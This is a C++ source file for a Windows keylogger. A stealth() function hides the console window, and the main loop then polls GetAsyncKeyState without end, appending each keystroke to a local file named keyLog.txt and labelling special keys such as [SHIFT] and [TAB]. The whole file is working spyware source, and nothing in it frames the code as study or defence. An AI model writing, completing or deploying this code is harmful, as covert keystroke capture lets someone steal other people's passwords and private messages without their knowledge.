// Keylogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <winuser.h>
#include <iostream>
#define OUTPUT_PATH "keyLog.txt"
using namespace std;

//Function to hide the window.
void stealth()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth, 0);
}

//Function to save the key pressed by the user.
void save(int key_stroke)
{
	if (key_stroke == 1 || key_stroke == 2)
		return;
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(OUTPUT_PATH, "a+");

	//For the special keyboard characters TAB,ESC,ENTER...
	switch (key_stroke)
	{
		case 8:			fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
						break;

		case 13:		fprintf(OUTPUT_FILE, "%s", "\n");           
						break;

		case 32:		fprintf(OUTPUT_FILE, "%s", " ");
						break;

		case VK_TAB:	fprintf(OUTPUT_FILE, "%s", "[TAB]");        
						break;

		case VK_SHIFT:  fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
						break;

		case VK_CONTROL:fprintf(OUTPUT_FILE, "%s", "[CTRL]");    
						break;

		case VK_ESCAPE: fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
						break;

		case VK_END:    fprintf(OUTPUT_FILE, "%s", "[END]");
						break;

		case VK_HOME:   fprintf(OUTPUT_FILE, "%s", "[HOME]");
						break;

		case VK_LEFT:   fprintf(OUTPUT_FILE, "%s", "[LEFT]");       
						break;

		case VK_UP:     fprintf(OUTPUT_FILE, "%s", "[UP]");         
						break;

		case VK_RIGHT:  fprintf(OUTPUT_FILE, "%s", "[RIGHT]");      
						break;

		case VK_DOWN:   fprintf(OUTPUT_FILE, "%s", "[DOWN]");       
						break;

		case VK_CAPITAL:fprintf(OUTPUT_FILE, "%s", "[CAPS]");
						break;

		case 190:
		case 110:       fprintf(OUTPUT_FILE, "%s", ".");            
						break;

		default:        fprintf(OUTPUT_FILE, "%s", &key_stroke);   
						break;
	}

	fclose(OUTPUT_FILE);
}


int main()
{
	int i;
	char ch;
	stealth();
	while (1)
	{
		//To check whether the a key was pressed on the keyboard.
		for (i = 8; i <= 180; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				save(i);	//Save the key in the log
			}
		}
	}
	return 0;
}

